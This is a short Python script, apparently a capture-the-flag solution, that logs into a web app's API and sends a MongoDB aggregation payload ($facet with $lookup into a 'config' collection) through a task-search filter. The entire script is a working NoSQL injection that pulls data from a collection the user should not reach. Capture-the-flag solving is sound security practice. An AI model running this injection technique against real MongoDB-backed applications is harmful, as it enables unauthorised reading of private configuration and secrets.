import requests

payload = {
	"$facet": {
		"out": [
			{
				"$lookup": {
					"from": "config",
					"localField": "b01lers",
					"foreignField": "b01lers",
					"as": "out",
				}
			},
			{"$limit": 1},
		]
	}
}

URL = "http://chal.competitivecyber.club:3002/"
# URL = "http://localhost:3000/"
session = requests.Session()


session.post(URL + "api/v0/user/login", json={"username": "mogodb", "password": "mogodb"})
print(session.cookies)
print(session.post(URL + "api/v0/tasks/", json={"title": "test"}).text)
print(session.get(URL + "api/v0/tasks/search", json={"filter": payload}).text)
